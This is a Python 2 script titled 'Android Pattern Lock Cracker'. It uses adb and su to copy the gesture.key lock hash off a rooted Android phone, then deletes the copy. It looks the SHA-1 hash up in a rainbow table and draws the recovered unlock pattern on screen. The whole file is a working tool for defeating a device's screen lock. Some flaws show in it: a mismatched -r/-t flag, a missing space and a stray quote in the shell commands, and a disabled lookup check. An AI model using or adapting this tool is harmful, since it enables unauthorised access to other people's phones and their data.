#!/usr/bin/env python
# encoding: utf-8
"""
Android Pattern Lock Cracker

Created by Yiming Jing on 2012-04-14.
Copyright (c) 2012 . All rights reserved.
"""
from Tkinter import Tk, Canvas, mainloop

help_message = '''
patterncracker -i gesture_file [-r rainbow_table_file] 

-i, --input
    Full path to the raw image file
'''

class Usage(Exception):
    def __init__(self, msg):
        self.msg = msg

def crack_pattern(hash, table):
    print "[1] Loading rainbow table..."
    dict = {}
    hash = hash.strip().upper()
    for entry in table:
        tmp = entry.split(';')
        dict[ tmp[2].strip() ] = tmp[0].strip()
    print "[2] Cracking pattern lock..."
    print "    [+] Got hash: %s" % hash
    print "    [+] Working...."
    
    #if hash not in dict.keys():
        #print "    [-] Sorry, pattern not cracked, please check input."
        #return
    result = dict[hash]
    print "    [+] Pattern lock cracked: %s" % result
    print "[3] Draw it on your screen!"
    
    draw(result)


def draw(sequence):
    screen = Tk()
    w = Canvas(screen, width=480, height = 480)
    w.pack()

    w.create_oval(80,80,160,160,fill="green") 
    w.create_oval(80 +120,80,160 +120,160, fill="green")
    w.create_oval(80 +240,80,160 +240,160, fill="green")
    w.create_oval(80,80 +120,160,160+120,fill="green") 
    w.create_oval(80 +120,80 +120,160 +120,160+120, fill="green")
    w.create_oval(80 +240,80+120,160 +240,160+120, fill="green")
    w.create_oval(80,80 +240,160,160+240,fill="green") 
    w.create_oval(80 +120,80 +240,160 +120,160+240, fill="green")
    w.create_oval(80 +240,80+240,160 +240,160+240, fill="green")
   
    
    pos_dict = {"1":(120,120), "2":(240,120), "3":(360,120), "4":(120,240), "5":(240,240), "6":(360,240), "7":(120,360), "8":(240,360), "9":(360,360)}

    for i in range(len(sequence)-1):
        x1 = pos_dict[sequence[i]][0]
        y1 = pos_dict[sequence[i]][1]
        x2 = pos_dict[sequence[i+1]][0]
        y2 = pos_dict[sequence[i+1]][1]
        w.create_line(x1,y1,x2,y2,arrow="last",fill="red",width="5")

    mainloop()

def grab_gesture_from_phone():
    import os
    print "[0] Extracting secret from the device..."
    # os.system("adb pull /data/system/gesture.key >NUL")
    os.system("""adb shell "su -c 'cp/data/system/gesture.key /sdcard/' " >NUL""")
    os.system("adb pull /sdcard/gesture.key >NUL")
    os.system("""adb shell "rm /sdcard/gesture.key' " >NUL""")

def main(argv=None):
    if argv is None:
        argv = sys.argv
    gesturepath = tablepath = None

    try:
        try:
            opts, args = getopt.getopt(argv[1:], "hi:t:", ["help","gesture=","table="])
        except getopt.error, msg:
            raise Usage(msg)
    
        # option processing
        for option, value in opts:
            if option in ("-h", "--help"):
                raise Usage(help_message)
            if option in ("-i", "--input"):
                gesturepath = value
            if option in ("-t", "--table"):
                tablepath = value
    
    except Usage, err:
        print >> sys.stderr, sys.argv[0].split("/")[-1] + ": " + str(err.msg)
        return 2;

    try:
        grab_gesture_from_phone()

        if (gesturepath == None):
            gesturepath = "gesture.key"
        if (tablepath == None):
            tablepath = "AndroidGestureSHA1.txt"

        f = open(gesturepath, 'rb')
        hash = f.read().encode('hex')
        f.close()

        f = open(tablepath, 'r')
        table = f.readlines()
        f.close()
        crack_pattern(hash, table)
        
    except IOError as (errno, strerror):
        print "I/O error({0}): {1}".format(errno, strerror)
    except:
        print "Unexpected error:", sys.exc_info()[0]
        raise
    
if __name__ == "__main__":
    import sys
    import getopt
    sys.exit(main())
